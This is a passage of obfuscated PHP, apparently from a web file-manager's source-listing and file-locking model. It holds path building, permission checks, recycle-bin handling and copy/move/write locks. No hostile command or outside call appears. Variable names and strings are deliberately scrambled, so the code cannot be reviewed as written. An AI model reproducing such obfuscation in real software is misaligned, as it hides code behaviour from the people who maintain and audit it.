$íËÂÍ[$ıÇø’­­[$ö‘ã©£¨[394]]][$ö‘ã©£¨[32]]; } if (isset($¸É”ßóÍ[$ıÇø’­­[$ö‘ã©£¨[394]]])) { $ıÇø’­­[$ö‘ã©£¨[87]][$ö‘ã©£¨[473]] = array(); foreach ($¸É”ßóÍ[$ıÇø’­­[$ö‘ã©£¨[394]]] as $”ÉŞïÃı) { $İ¢Óº²• = $İª¸ §Ç[$”ÉŞïÃı]; $ıÇø’­­[$ö‘ã©£¨[87]][$ö‘ã©£¨[473]][] = array($ö‘ã©£¨[474] => $İ¢Óº²•[$ö‘ã©£¨[392]], $ö‘ã©£¨[412] => $İ¢Óº²•[$ö‘ã©£¨[32]], $ö‘ã©£¨[475] => $İ¢Óº²•[$ö‘ã©£¨[476]]); } } if (isset($İÍ“”ªÅ[$ıÇø’­­[$ö‘ã©£¨[394]]])) { $ıÇø’­­[$ö‘ã©£¨[87]][$ö‘ã©£¨[477]] = array(); foreach ($İÍ“”ªÅ[$ıÇø’­­[$ö‘ã©£¨[394]]] as $´ÍÙ»Ş) { $ıÇø’­­[$ö‘ã©£¨[87]][$ö‘ã©£¨[477]] = array($ö‘ã©£¨[478] => $´ÍÙ»Ş[$ö‘ã©£¨[479]], $ö‘ã©£¨[480] => $´ÍÙ»Ş[$ö‘ã©£¨[481]], $ö‘ã©£¨[482] => $´ÍÙ»Ş[$ö‘ã©£¨[394]], $ö‘ã©£¨[483] => $´ÍÙ»Ş[$ö‘ã©£¨[484]], $ö‘ã©£¨[485] => $´ÍÙ»Ş[$ö‘ã©£¨[486]], $ö‘ã©£¨[487] => $´ÍÙ»Ş[$ö‘ã©£¨[487]], $ö‘ã©£¨[488] => $´ÍÙ»Ş[$ö‘ã©£¨[488]]); } } } unset($ıÇø’­­); return $¿ö–â®“; } protected function _listAppendChildren(&$Ç“œù¾¡, $³¾÷”÷¢) { $ª¦Çğ®ª =& $_SERVER[ì…™Î¶Ï]; $âÚåÎ¹ = array(); $¢¸Ñé¬ = array($ª¦Çğ®ª[202] => 0, $ª¦Çğ®ª[203] => 0); foreach ($Ç“œù¾¡ as &$«ƒº®Ã) { if (!$«ƒº®Ã[$ª¦Çğ®ª[402]]) { continue; } $âÚåÎ¹[] = $«ƒº®Ã[$ª¦Çğ®ª[394]]; } unset($«ƒº®Ã); if (!$âÚåÎ¹) { return; } $ÆğÅ„ïø = array($ª¦Çğ®ª[489] => array($ª¦Çğ®ª[7], $âÚåÎ¹)); $¨Å‰ª˜œ = array($ª¦Çğ®ª[489], $ª¦Çğ®ª[402], $ª¦Çğ®ª[490] => $ª¦Çğ®ª[491]); $èëãˆÏÀ = $this->field($¨Å‰ª˜œ)->where($ÆğÅ„ïø)->group($ª¦Çğ®ª[492])->select(); $ÂÚäà¯ = array(); foreach ($èëãˆÏÀ as $æâ»¯´ç) { $¦€ó€ñ = $æâ»¯´ç[$ª¦Çğ®ª[489]]; $Æ¡’Ğ³á = $æâ»¯´ç[$ª¦Çğ®ª[402]] == $ª¦Çğ®ª[89] ? $ª¦Çğ®ª[203] : $ª¦Çğ®ª[202]; if (!isset($ÂÚäà¯[$¦€ó€ñ])) { $ÂÚäà¯[$¦€ó€ñ] = array($ª¦Çğ®ª[202] => 0, $ª¦Çğ®ª[203] => 0); } $ÂÚäà¯[$¦€ó€ñ][$Æ¡’Ğ³á] += $æâ»¯´ç[$ª¦Çğ®ª[491]]; } foreach ($Ç“œù¾¡ as &$«ƒº®Ã) { if (!$«ƒº®Ã[$ª¦Çğ®ª[402]]) { continue; } $¤íØ‰ = is_array($ÂÚäà¯[$«ƒº®Ã[$ª¦Çğ®ª[394]]]) ? $ÂÚäà¯[$«ƒº®Ã[$ª¦Çğ®ª[394]]] : $¢¸Ñé¬; $«ƒº®Ã[$ª¦Çğ®ª[203]] = $¤íØ‰[$ª¦Çğ®ª[203]]; $«ƒº®Ã[$ª¦Çğ®ª[202]] = $¤íØ‰[$ª¦Çğ®ª[202]]; unset($«ƒº®Ã[$ª¦Çğ®ª[404]]); } unset($«ƒº®Ã); } protected function _listAppendAuth(&$»‘Œ¨ºÎ) { $ïâ±ŒŸ =& $_SERVER[ì…™Î¶Ï]; if (!defined($ïâ±ŒŸ[465])) { return; } $èÂâ…—ö = array(); foreach ($»‘Œ¨ºÎ as $ìËŠô¾æ) { if ($ìËŠô¾æ[$ïâ±ŒŸ[403]] == self::TYPE_GROUP) { $èÂâ…—ö[] = $ìËŠô¾æ[$ïâ±ŒŸ[394]]; } } if (!$èÂâ…—ö) { return; } $àÓ–Õš¿ = array_to_keyvalue($»‘Œ¨ºÎ, $ïâ±ŒŸ[394]); $áé¼ÏÈ¨ = Model($ïâ±ŒŸ[493])->getSourceList($èÂâ…—ö, $àÓ–Õš¿); foreach ($»‘Œ¨ºÎ as $‰ØÍ¬à => &$ìËŠô¾æ) { $ìËŠô¾æ[$ïâ±ŒŸ[405]] = $áé¼ÏÈ¨[$ìËŠô¾æ[$ïâ±ŒŸ[394]]]; if (!$ìËŠô¾æ[$ïâ±ŒŸ[405]] && $ìËŠô¾æ[$ïâ±ŒŸ[403]] == self::TYPE_GROUP) { $ìËŠô¾æ[$ïâ±ŒŸ[405]] = Action($ïâ±ŒŸ[494])->pathGroupAuthMake($ìËŠô¾æ[$ïâ±ŒŸ[495]]); if (!$ìËŠô¾æ[$ïâ±ŒŸ[405]] && !_get($GLOBALS, $ïâ±ŒŸ[496])) { $ìËŠô¾æ[$ïâ±ŒŸ[195]] = !1; $ìËŠô¾æ[$ïâ±ŒŸ[194]] = !1; } } if ($ìËŠô¾æ[$ïâ±ŒŸ[405]]) { $ìËŠô¾æ[$ïâ±ŒŸ[195]] = AuthModel::authCheckEdit($ìËŠô¾æ[$ïâ±ŒŸ[405]][$ïâ±ŒŸ[406]]); $ìËŠô¾æ[$ïâ±ŒŸ[194]] = AuthModel::authCheckView($ìËŠô¾æ[$ïâ±ŒŸ[405]][$ïâ±ŒŸ[406]]); } $this->groupPathDisplay($ìËŠô¾æ); } unset($ìËŠô¾æ); } public function _listAppendAuthSecret(&$²Ö³¯ìô) { $Àæƒ×Û =& $_SERVER[ì…™Î¶Ï]; if (Model($Àæƒ×Û[424])->get($Àæƒ×Û[497]) != $Àæƒ×Û[89]) { return; } static $Æ‰œè‚€ = false; if (!$Æ‰œè‚€) { $¯”ğô = Model($Àæƒ×Û[498]); $ø’Ï¥Ì­ = Model($Àæƒ×Û[499]); $Æ‰œè‚€ = $ø’Ï¥Ì­->listData(); $Æ‰œè‚€ = array_to_keyvalue($Æ‰œè‚€, $Àæƒ×Û[394]); $Ô’¿ôø™ = json_decode(Model($Àæƒ×Û[424])->get($Àæƒ×Û[500]), !0); $Ô’¿ôø™ = array_to_keyvalue($Ô’¿ôø™, $Àæƒ×Û[392]); foreach ($Æ‰œè‚€ as $ñçÇ›ß¦ => $Úš‹•õƒ) { $§¸§Èöæ = $Ô’¿ôø™[$Úš‹•õƒ[$Àæƒ×Û[501]]]; if (!$§¸§Èöæ) { $ø’Ï¥Ì­->remove($Úš‹•õƒ[$Àæƒ×Û[392]]); unset($Æ‰œè‚€[$ñçÇ›ß¦]); continue; } $±¥¬â¡ = $¯”ğô->listData($§¸§Èöæ[$Àæƒ×Û[405]]); if (!$±¥¬â¡) { $ø’Ï¥Ì­->remove($Úš‹•õƒ[$Àæƒ×Û[392]]); unset($Æ‰œè‚€[$ñçÇ›ß¦]); continue; } $Úš‹•õƒ[$Àæƒ×Û[405]] = $±¥¬â¡; $Úš‹•õƒ[$Àæƒ×Û[502]] = $§¸§Èöæ; $Úš‹•õƒ[$Àæƒ×Û[503]] = Model($Àæƒ×Û[504])->getInfoSimpleOuter($Úš‹•õƒ[$Àæƒ×Û[443]]); $Æ‰œè‚€[$ñçÇ›ß¦] = $Úš‹•õƒ; } } $—ü„œÀä = defined($Àæƒ×Û[505]) ? USER_ID : $Àæƒ×Û[12]; $±…Õ³ø½ = array(); $ßÖÔÜ„á = $this->_listAppendPath($±…Õ³ø½, !0); foreach ($²Ö³¯ìô as $ñçÇ›ß¦ => &$Úš‹•õƒ) { if (!is_array($Úš‹•õƒ[$Àæƒ×Û[405]])) { continue; } if ($Úš‹•õƒ[$Àæƒ×Û[403]] != $Àæƒ×Û[506]) { continue; } if (isset($Æ‰œè‚€[$Úš‹•õƒ[$Àæƒ×Û[394]]])) { $§›Øà…¥ = $Æ‰œè‚€[$Úš‹•õƒ[$Àæƒ×Û[394]]]; if (!is_array($Úš‹•õƒ[$Àæƒ×Û[456]])) { $Úš‹•õƒ[$Àæƒ×Û[456]] = array(); } $Úš‹•õƒ[$Àæƒ×Û[456]][$Àæƒ×Û[507]] = $§›Øà…¥[$Àæƒ×Û[501]]; $Úš‹•õƒ[$Àæƒ×Û[405]][$Àæƒ×Û[508]] = $§›Øà…¥; $Úš‹•õƒ[$Àæƒ×Û[405]][$Àæƒ×Û[509]] = $Úš‹•õƒ[$Àæƒ×Û[510]]; $Úš‹•õƒ[$Àæƒ×Û[405]][$Àæƒ×Û[511]] = $Àæƒ×Û[89]; if ($§›Øà…¥[$Àæƒ×Û[443]] != $—ü„œÀä) { $Úš‹•õƒ[$Àæƒ×Û[405]][$Àæƒ×Û[406]] = $Úš‹•õƒ[$Àæƒ×Û[405]][$Àæƒ×Û[406]] & $§›Øà…¥[$Àæƒ×Û[405]][$Àæƒ×Û[405]]; } continue; } $¿ãïâÛ = $this->parentLevelArray($Úš‹•õƒ[$Àæƒ×Û[512]]); $¦ºÈõóÅ = array_reverse($¿ãïâÛ); foreach ($¦ºÈõóÅ as $»¢Ô§ÓÀ => $ÀÏ÷ª‰) { if (!isset($Æ‰œè‚€[$ÀÏ÷ª‰])) { continue; } $§›Øà…¥ = $Æ‰œè‚€[$ÀÏ÷ª‰]; $Úš‹•õƒ[$Àæƒ×Û[405]][$Àæƒ×Û[508]] = $§›Øà…¥; if ($§›Øà…¥[$Àæƒ×Û[443]] != $—ü„œÀä) { $Úš‹•õƒ[$Àæƒ×Û[405]][$Àæƒ×Û[406]] = $Úš‹•õƒ[$Àæƒ×Û[405]][$Àæƒ×Û[406]] & $§›Øà…¥[$Àæƒ×Û[405]][$Àæƒ×Û[405]]; } $·ÆÂıîè = $Àæƒ×Û[12]; $Š»ó¾ş™ = count($¿ãïâÛ) - $»¢Ô§ÓÀ; for ($ÓÈä¢ŸÃ = 0; $ÓÈä¢ŸÃ < $Š»ó¾ş™; $ÓÈä¢ŸÃ++) { if (!isset($ßÖÔÜ„á[$¿ãïâÛ[$ÓÈä¢ŸÃ]])) { $·ÆÂıîè = $Àæƒ×Û[12]; break; } $·ÆÂıîè = $·ÆÂıîè . rtrim($ßÖÔÜ„á[$¿ãïâÛ[$ÓÈä¢ŸÃ]], $Àæƒ×Û[8]) . $Àæƒ×Û[8]; } $Úš‹•õƒ[$Àæƒ×Û[405]][$Àæƒ×Û[509]] = rtrim($·ÆÂıîè, $Àæƒ×Û[8]) . $Àæƒ×Û[8]; break; } } unset($Úš‹•õƒ); } public function groupPathDisplay(&$ìøô¢´Ğ) { $²›£å‘² =& $_SERVER[ì…™Î¶Ï]; if ($ìøô¢´Ğ[$²›£å‘²[403]] != self::TYPE_GROUP) { return; } $“ñ’î¸ü = Model($²›£å‘²[513])->getInfo($ìøô¢´Ğ[$²›£å‘²[495]]); $ÛÊù•üÜ = $this->parentLevelArray($“ñ’î¸ü[$²›£å‘²[512]]); $îÌ’»– = $²›£å‘²[12]; foreach ($ÛÊù•üÜ as $õ“ÄÕ») { $º‰åÏ‡û = Model($²›£å‘²[513])->getInfo($õ“ÄÕ»); $îÌ’»– .= $º‰åÏ‡û[$²›£å‘²[87]][$²›£å‘²[394]] . $²›£å‘²[50]; } $ìøô¢´Ğ[$²›£å‘²[514]] = $“ñ’î¸ü[$²›£å‘²[489]]; $ìøô¢´Ğ[$²›£å‘²[515]] = $“ñ’î¸ü[$²›£å‘²[512]]; $ìøô¢´Ğ[$²›£å‘²[516]] = $“ñ’î¸ü[$²›£å‘²[517]]; $ìøô¢´Ğ[$²›£å‘²[518]] = $îÌ’»– . $“ñ’î¸ü[$²›£å‘²[87]][$²›£å‘²[394]]; } protected function _listAppendPath(&$áì€ùö¾, $Éù«ßÈ = false) { $º¿½ÅŠ =& $_SERVER[ì…™Î¶Ï]; static $ŒÌùºï = array(); $È ñùÃ = array(); $”¹ùµ­ª = array(); if ($Éù«ßÈ) { return $ŒÌùºï; } foreach ($áì€ùö¾ as &$ş÷®ıè«) { $äåÉëÑ = $ş÷®ıè«[$º¿½ÅŠ[394]]; if ($ş÷®ıè«[$º¿½ÅŠ[402]] == $º¿½ÅŠ[89] && $ş÷®ıè«[$º¿½ÅŠ[489]] != 0) { $ŒÌùºï[$äåÉëÑ] = $ş÷®ıè«[$º¿½ÅŠ[32]]; } if ($ş÷®ıè«[$º¿½ÅŠ[402]] == $º¿½ÅŠ[89] && $ş÷®ıè«[$º¿½ÅŠ[489]] == 0 && !isset($ŒÌùºï[$äåÉëÑ])) { $ŒÌùºï[$äåÉëÑ] = $this->_listAppendPathRoot($ş÷®ıè«, array()); } if (isset($”¹ùµ­ª[$ş÷®ıè«[$º¿½ÅŠ[512]]])) { continue; } $”¹ùµ­ª[$ş÷®ıè«[$º¿½ÅŠ[512]]] = !0; $Àşş†êê = $this->parentLevelArray($ş÷®ıè«[$º¿½ÅŠ[512]]); foreach ($Àşş†êê as $Ì™ÌêøÙ => $…Ë¹¦) { if (isset($ŒÌùºï[$…Ë¹¦])) { continue; } if ($Ì™ÌêøÙ == 0) { $ŒÌùºï[$…Ë¹¦] = $this->_listAppendPathRoot($ş÷®ıè«, $Àşş†êê); } if ($Ì™ÌêøÙ != 0) { $È ñùÃ[] = $…Ë¹¦; } } } unset($ş÷®ıè«); $È ñùÃ = array_unique($È ñùÃ); if (count($È ñùÃ) > 0) { $™ÙÈ­ô = array($º¿½ÅŠ[409] => array($º¿½ÅŠ[410], $È ñùÃ)); if (count($È ñùÃ) == 1) { $µ¯Ãğ¥• = $this->sourceInfo($È ñùÃ[0]); $î£ó°‰ã = is_array($µ¯Ãğ¥•) ? array($µ¯Ãğ¥•) : !1; } else { $î£ó°‰ã = $this->field($º¿½ÅŠ[519])->where($™ÙÈ­ô)->select(); } if (!$î£ó°‰ã) { $î£ó°‰ã = array(); } foreach ($î£ó°‰ã as $²‡ø½“ô) { $ŒÌùºï[$²‡ø½“ô[$º¿½ÅŠ[394]]] = $²‡ø½“ô[$º¿½ÅŠ[32]]; } } $·üÓÑõØ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $•Í¿Î¤ê = array(); foreach ($áì€ùö¾ as &$ş÷®ıè«) { $Óœé–È = $ş÷®ıè«[$º¿½ÅŠ[512]]; $ˆ¤ÏµÓ = $º¿½ÅŠ[12]; if (isset($•Í¿Î¤ê[$Óœé–È])) { $ˆ¤ÏµÓ = $•Í¿Î¤ê[$Óœé–È]; } else { $Àşş†êê = $this->parentLevelArray($ş÷®ıè«[$º¿½ÅŠ[512]]); foreach ($Àşş†êê as $Ì™ÌêøÙ => $…Ë¹¦) { if (isset($ŒÌùºï[$…Ë¹¦])) { $ˆ¤ÏµÓ .= $ŒÌùºï[$…Ë¹¦] . $º¿½ÅŠ[8]; } } $•Í¿Î¤ê[$Óœé–È] = $ˆ¤ÏµÓ; } $ˆ¤ÏµÓ .= $ş÷®ıè«[$º¿½ÅŠ[32]]; if ($ş÷®ıè«[$º¿½ÅŠ[402]] == $º¿½ÅŠ[89]) { $ˆ¤ÏµÓ .= $º¿½ÅŠ[8]; } $ş÷®ıè«[$º¿½ÅŠ[510]] = str_replace($º¿½ÅŠ[520], $º¿½ÅŠ[8], $ˆ¤ÏµÓ); if ($ş÷®ıè«[$º¿½ÅŠ[489]] == $º¿½ÅŠ[190]) { $ş÷®ıè«[$º¿½ÅŠ[32]] = trim($ŒÌùºï[$ş÷®ıè«[$º¿½ÅŠ[394]]], $º¿½ÅŠ[8]); $ş÷®ıè«[$º¿½ÅŠ[510]] = $ş÷®ıè«[$º¿½ÅŠ[32]] . $º¿½ÅŠ[8]; } if (intval($ş÷®ıè«[$º¿½ÅŠ[403]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ş÷®ıè«, $Àşş†êê, $·üÓÑõØ); } } unset($ş÷®ıè«); return $áì€ùö¾; } private function _listAppendPathRecycle(&$¬«öÄ°è, $ß±ÂÜ‰™, $ÆÓ»ã½¹) { $ƒıÙÏ–Î =& $_SERVER[ì…™Î¶Ï]; if (!in_array($ÆÓ»ã½¹, $ß±ÂÜ‰™) && $¬«öÄ°è[$ƒıÙÏ–Î[394]] != $ÆÓ»ã½¹) { return; } $©¦¬îëÈ = explode($ƒıÙÏ–Î[8], trim($¬«öÄ°è[$ƒıÙÏ–Î[510]], $ƒıÙÏ–Î[8])); $ˆ€©àË = implode($ƒıÙÏ–Î[8], array_slice($©¦¬îëÈ, 2)); $¬«öÄ°è[$ƒıÙÏ–Î[510]] = $ƒıÙÏ–Î[8] . LNG($ƒıÙÏ–Î[521]) . $ƒıÙÏ–Î[8] . ltrim($ˆ€©àË, $ƒıÙÏ–Î[8]); $¬«öÄ°è[$ƒıÙÏ–Î[512]] = $ƒıÙÏ–Î[522] . implode($ƒıÙÏ–Î[50], array_slice($ß±ÂÜ‰™, 1)) . $ƒıÙÏ–Î[50]; if ($¬«öÄ°è[$ƒıÙÏ–Î[394]] == $ÆÓ»ã½¹) { $¬«öÄ°è[$ƒıÙÏ–Î[512]] = $ƒıÙÏ–Î[522]; $¬«öÄ°è[$ƒıÙÏ–Î[489]] = $ƒıÙÏ–Î[190]; $¬«öÄ°è[$ƒıÙÏ–Î[32]] = LNG($ƒıÙÏ–Î[521]); } $¬«öÄ°è[$ƒıÙÏ–Î[523]] = $ƒıÙÏ–Î[524]; } protected function _listAppendPathRoot(&$ƒÄï ï, $£üšš£¢) { $Î²­Õš =& $_SERVER[ì…™Î¶Ï]; $¬ çÜÈû = $Î²­Õš[12]; if ($ƒÄï ï[$Î²­Õš[403]] == self::TYPE_USER) { if (defined($Î²­Õš[465]) && $ƒÄï ï[$Î²­Õš[495]] == USER_ID) { $¬ çÜÈû = LNG($Î²­Õš[525]); if (!$£üšš£¢) { $ƒÄï ï[$Î²­Õš[32]] = $¬ çÜÈû; } } else { $®çÏ¤ó« = Model($Î²­Õš[504])->getInfoSimple($ƒÄï ï[$Î²­Õš[495]]); $¬ çÜÈû = LNG($Î²­Õš[526]) . $Î²­Õš[159] . $®çÏ¤ó«[$Î²­Õš[32]] . $Î²­Õš[527]; } } else { if ($ƒÄï ï[$Î²­Õš[403]] == self::TYPE_GROUP) { $®çÏ¤ó« = Model($Î²­Õš[513])->getInfoSimple($ƒÄï ï[$Î²­Õš[495]]); $¬ çÜÈû = $®çÏ¤ó«[$Î²­Õš[32]]; } else { if ($ƒÄï ï[$Î²­Õš[403]] == self::TYPE_SYSTEM) { $¬ çÜÈû = $Î²­Õš[528]; } } } $¬ çÜÈû = $¬ çÜÈû ? $Î²­Õš[8] . $¬ çÜÈû . $Î²­Õš[8] : $Î²­Õš[8]; return $¬ çÜÈû; } protected function _listAppendUser(&$¿ŠñÚ§¬) { $‚ĞÂàˆ¢ =& $_SERVER[ì…™Î¶Ï]; $¡¼óÃŠÔ = array_to_keyvalue($¿ŠñÚ§¬, $‚ĞÂàˆ¢[12], $‚ĞÂàˆ¢[443]); $ÚÚ‹Ûß = array_to_keyvalue($¿ŠñÚ§¬, $‚ĞÂàˆ¢[12], $‚ĞÂàˆ¢[445]); $í««÷§ = array_merge($¡¼óÃŠÔ, $ÚÚ‹Ûß); $åØ‰È÷ç = Model($‚ĞÂàˆ¢[529])->userListInfo($í««÷§); foreach ($¿ŠñÚ§¬ as &$ä¶úÑŸï) { $Ì÷ğã†º = $ä¶úÑŸï[$‚ĞÂàˆ¢[443]]; $ä¶úÑŸï[$‚ĞÂàˆ¢[443]] = $åØ‰È÷ç[$Ì÷ğã†º] ? $åØ‰È÷ç[$Ì÷ğã†º] : !1; $Ì÷ğã†º = $ä¶úÑŸï[$‚ĞÂàˆ¢[445]]; $ä¶úÑŸï[$‚ĞÂàˆ¢[445]] = $åØ‰È÷ç[$Ì÷ğã†º] ? $åØ‰È÷ç[$Ì÷ğã†º] : !1; if (isset($ä¶úÑŸï[$‚ĞÂàˆ¢[456]]) && $ä¶úÑŸï[$‚ĞÂàˆ¢[456]][$‚ĞÂàˆ¢[530]]) { $à¯ñô»³ = $GLOBALS[$‚ĞÂàˆ¢[6]][$‚ĞÂàˆ¢[90]][$‚ĞÂàˆ¢[531]]; if ($ä¶úÑŸï[$‚ĞÂàˆ¢[456]][$‚ĞÂàˆ¢[532]] <= time() - $à¯ñô»³) { $this->metaSet($ä¶úÑŸï[$‚ĞÂàˆ¢[394]], $‚ĞÂàˆ¢[530], null); $this->metaSet($ä¶úÑŸï[$‚ĞÂàˆ¢[394]], $‚ĞÂàˆ¢[532], null); unset($ä¶úÑŸï[$‚ĞÂàˆ¢[456]][$‚ĞÂàˆ¢[530]]); continue; } $ÌÊä§¦¯ = $ä¶úÑŸï[$‚ĞÂàˆ¢[456]][$‚ĞÂàˆ¢[530]]; $ä¶úÑŸï[$‚ĞÂàˆ¢[456]][$‚ĞÂàˆ¢[533]] = Model($‚ĞÂàˆ¢[529])->getInfoSimpleOuter($ÌÊä§¦¯); } } unset($ä¶úÑŸï); } public function parentLevelArray($¦¯¸Å¼Ñ) { $ıç€â´œ =& $_SERVER[ì…™Î¶Ï]; $¦¯¸Å¼Ñ = explode($ıç€â´œ[50], trim($¦¯¸Å¼Ñ, $ıç€â´œ[50])); return array_remove_value($¦¯¸Å¼Ñ, $ıç€â´œ[190]); } public function listAll($Æç”Ù) { $Á¥·ÍÅ =& $_SERVER[ì…™Î¶Ï]; $ò¡æ«¢Œ = $this->sourceInfo($Æç”Ù); $¦Ü¼äÔ = array($Á¥·ÍÅ[534] => array($Á¥·ÍÅ[535], $ò¡æ«¢Œ[$Á¥·ÍÅ[512]] . $Æç”Ù . $Á¥·ÍÅ[536]), $Á¥·ÍÅ[537] => 0); $Ìş—®‹® = $Á¥·ÍÅ[538]; $›³²òØˆ = "\x4c\x45\106\x54\x20\112\x4f\111\116\x20{$this->tablePrefix}\151\157\137\146\151\x6c\145\40\x66\x69\x6c\145\40\x6f\x6e\x20\x73\157\165\162\143\145\56\146\151\x6c\145\x49\x44\x20\75\40\146\151\154\145\56\146\151\x6c\x65\x49\x44"; $¨áöŞ×À = $this->alias($Á¥·ÍÅ[435])->field($Ìş—®‹®)->where($¦Ü¼äÔ)->join($›³²òØˆ)->select(); $this->_listAppendAuth($¨áöŞ×À); $this->_listAppendUser($¨áöŞ×À); $this->_listAppendPath($¨áöŞ×À); $¨áöŞ×À = array_to_keyvalue($¨áöŞ×À, $Á¥·ÍÅ[394]); $µò¾¨È– = "\57{$ò¡æ«¢Œ[$Á¥·ÍÅ[32]]}\57"; $µò¾¨È– = $µò¾¨È– == $Á¥·ÍÅ[520] ? $Á¥·ÍÅ[8] : $µò¾¨È–; $Ê™ŸÅÕÚ = array(); foreach ($¨áöŞ×À as $º†©ÓÙã => $õ×Ò€½Ï) { $¢ü–¥ß = $this->parentLevelArray($õ×Ò€½Ï[$Á¥·ÍÅ[512]]); array_shift($¢ü–¥ß); $¿®·º“ˆ = $µò¾¨È–; for ($É»ÄÀĞ = 0; $É»ÄÀĞ < count($¢ü–¥ß); $É»ÄÀĞ++) { $¿®·º“ˆ .= $¨áöŞ×À[$¢ü–¥ß[$É»ÄÀĞ]][$Á¥·ÍÅ[32]] . $Á¥·ÍÅ[8]; } $¿®·º“ˆ .= $õ×Ò€½Ï[$Á¥·ÍÅ[32]]; if ($õ×Ò€½Ï[$Á¥·ÍÅ[402]]) { $¿®·º“ˆ .= $Á¥·ÍÅ[8]; } $¿®·º“ˆ = str_replace($Á¥·ÍÅ[520], $Á¥·ÍÅ[8], $¿®·º“ˆ); $¿®·º“ˆ = str_replace($Á¥·ÍÅ[520], $Á¥·ÍÅ[8], $¿®·º“ˆ); $İ²ŞÊ”‹ = array($Á¥·ÍÅ[413] => str_replace($Á¥·ÍÅ[520], $Á¥·ÍÅ[8], $¿®·º“ˆ), $Á¥·ÍÅ[539] => intval($õ×Ò€½Ï[$Á¥·ÍÅ[402]]), $Á¥·ÍÅ[87] => $this->pathInfoFilter($õ×Ò€½Ï)); if (!$õ×Ò€½Ï[$Á¥·ÍÅ[402]]) { $İ²ŞÊ”‹[$Á¥·ÍÅ[458]] = $õ×Ò€½Ï[$Á¥·ÍÅ[458]]; $İ²ŞÊ”‹[$Á¥·ÍÅ[88]] = $õ×Ò€½Ï[$Á¥·ÍÅ[78]]; } $Ê™ŸÅÕÚ[] = $İ²ŞÊ”‹; } return $Ê™ŸÅÕÚ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ı¶®­ÚÃ) { $š©¼º© =& $_SERVER[ì…™Î¶Ï]; if (!$this->allowLock()) { return; } $this->_lockCheck($š©¼º©[540], $ı¶®­ÚÃ); $×«â¢ÔØ = 1; $this->_lockEvent($ı¶®­ÚÃ, array($š©¼º©[541], $š©¼º©[542]), $×«â¢ÔØ); $this->_lockParent($ı¶®­ÚÃ, array($š©¼º©[542]), $×«â¢ÔØ); $this->_lockEvent($ı¶®­ÚÃ, array($š©¼º©[543], $š©¼º©[544]), $×«â¢ÔØ); $this->_lockCheckEnd($š©¼º©[540], $ı¶®­ÚÃ); } public function lockCopyEnd($¡ÙùğĞğ) { $ÈŞ·ç»¼ =& $_SERVER[ì…™Î¶Ï]; if (!$this->allowLock()) { return; } $°€¡ÒäŞ = 0; $this->_lockEvent($¡ÙùğĞğ, array($ÈŞ·ç»¼[541], $ÈŞ·ç»¼[542]), $°€¡ÒäŞ); $this->_lockParent($¡ÙùğĞğ, array($ÈŞ·ç»¼[542]), $°€¡ÒäŞ); $this->_lockEvent($¡ÙùğĞğ, array($ÈŞ·ç»¼[543], $ÈŞ·ç»¼[544]), $°€¡ÒäŞ); } public function lockWriteStart($…øÃÔ§à, $Õµ¸İƒã = '') { $ıó€«Œı =& $_SERVER[ì…™Î¶Ï]; if (!$this->allowLock()) { return; } $this->_lockCheck($ıó€«Œı[541], $…øÃÔ§à); $Şø÷‡†Â = 1; $this->_lockKey($ıó€«Œı[545] . $…øÃÔ§à . $ıó€«Œı[10] . $Õµ¸İƒã, $Şø÷‡†Â); $this->_lockEvent($…øÃÔ§à, array($ıó€«Œı[540], $ıó€«Œı[542]), $Şø÷‡†Â); $this->_lockParent($…øÃÔ§à, array($ıó€«Œı[540], $ıó€«Œı[542]), $Şø÷‡†Â); $this->_lockCheckEnd($ıó€«Œı[541], $…øÃÔ§à); } public function lockWriteEnd($×İ¸ê¬Õ, $Ñá‚Ï = '') { $¾ı½×µù =& $_SERVER[ì…™Î¶Ï]; if (!$this->allowLock()) { return; } $¨ ©µø— = 0; $this->_lockKey($¾ı½×µù[545] . $×İ¸ê¬Õ . $¾ı½×µù[10] . $Ñá‚Ï, $¨ ©µø—); $this->_lockEvent($×İ¸ê¬Õ, array($¾ı½×µù[540], $¾ı½×µù[542]), $¨ ©µø—); $this->_lockParent($×İ¸ê¬Õ, array($¾ı½×µù[540], $¾ı½×µù[542]), $¨ ©µø—); } public function lockMoveStart($·‘¼‹á) { $ÁÂÕÖÎÕ =& $_SERVER[ì…™Î¶Ï]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÁÂÕÖÎÕ[542], $·‘¼‹á); $Ğ×á—³” = 1; $this->_lockKey($ÁÂÕÖÎÕ[546] . $·‘¼‹á, $Ğ×á—³”); $this->_lockEvent($·‘¼‹á, array($ÁÂÕÖÎÕ[540], $ÁÂÕÖÎÕ[541]), $Ğ×á—³”); $this->_lockParent($·‘¼‹á, array($ÁÂÕÖÎÕ[540], $ÁÂÕÖÎÕ[542]), $Ğ×á—³”); $this->_lockEvent($·‘¼‹á, array($ÁÂÕÖÎÕ[547], $ÁÂÕÖÎÕ[543], $ÁÂÕÖÎÕ[544]), $Ğ×á—³”); $this->_lockCheckEnd($ÁÂÕÖÎÕ[542], $·‘¼‹á); } public function lockMoveEnd($ù°÷àˆÔ) { $¢Ô—¤¾ =& $_SERVER[ì…™Î¶Ï]; if (!$this->allowLock()) { return; } $Ù›åÏ¥ = 0; $this->_lockKey($¢Ô—¤¾[546] . $ù°÷àˆÔ, $Ù›åÏ¥); $this->_lockEvent($ù°÷àˆÔ, array($¢Ô—¤¾[540], $¢Ô—¤¾[541]), $Ù›åÏ¥); $this->_lockParent($ù°÷àˆÔ, array($¢Ô—¤¾[540], $¢Ô—¤¾[542]), $Ù›åÏ¥); $this->_lockEvent($ù°÷àˆÔ, array($¢Ô—¤¾[547], $¢Ô—¤¾[543], $¢Ô—¤¾[544]), $Ù›åÏ¥); } private function _lockCheck($àò€Ó¶È, $ÄÚóğÜ) { $“‹Å²ÑĞ =& $_SERVER[ì…™Î¶Ï]; $Šè¿ƒ = $this->sourceInfo($ÄÚóğÜ); $ÏŒ’ÚÊÖ = $àò€Ó¶È . $“‹Å²ÑĞ[10] . $ÄÚóğÜ; $this->_lockTimeStart[$ÏŒ’ÚÊÖ] = timeFloat(); if (!is_array($Šè¿ƒ)) { return; } $¦¤œ×Ÿƒ = LNG($“‹Å²ÑĞ[548]); CacheLock::setErrorMsg($“‹Å²ÑĞ[159] . htmlspecialchars($Šè¿ƒ[$“‹Å²ÑĞ[32]]) . $“‹Å²ÑĞ[527] . $¦¤œ×Ÿƒ); $this->_lockKey($ÏŒ’ÚÊÖ, 1); 